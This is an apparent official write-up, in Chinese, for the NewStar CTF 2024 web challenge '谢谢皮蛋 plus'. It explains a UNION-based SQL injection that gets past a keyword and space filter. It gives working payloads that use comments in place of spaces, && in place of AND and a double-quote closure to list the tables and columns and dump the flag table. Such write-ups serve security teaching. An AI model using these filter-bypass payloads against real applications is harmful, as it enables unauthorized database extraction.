# 谢谢皮蛋 plus

> 分类：Web

## 题目描述
联合注入，考查空格和 `and` 的绕过，并 ban 了报错注入。

```php
preg_match_all("/ |extractvalue|updataxml|and/i",$id)
```

## 考察知识点
- SQL 联合注入
- 空格绕过（/**/）
- and 绕过（&&）
- 双引号闭合

## 解法
注意这题是双引号闭合（双引号中带有单引号也可以执行成功，属于 MySQL 的一种特性）。

`and` 使用 `&&` 替换，空格使用 `/**/` 替换。

查询当前数据库：
```sql
-1"/**/union/**/select/**/1,database()#
```

查询所有表名：
```sql
-1"/**/union/**/select/**/1,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/=/**/database()#
```

查询所有列名：
```sql
-1"/**/union/**/select/**/1,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name/**/=/**/'Fl4g'/**/&&/**/table_schema/**/=/**/database()#
```

得到 flag：
```sql
-1"/**/union/**/select/**/group_concat(des),group_concat(value)/**/from/**/Fl4g#
```

## 参考答案
flag 未在 writeup 中给出（通过最后一条 SQL 得到）。

## 来源
- 作者：NewStar CTF 2024 官方 WriteUp | https://newstar.wiki/wp/2024/week2/web/pidan-plus.html
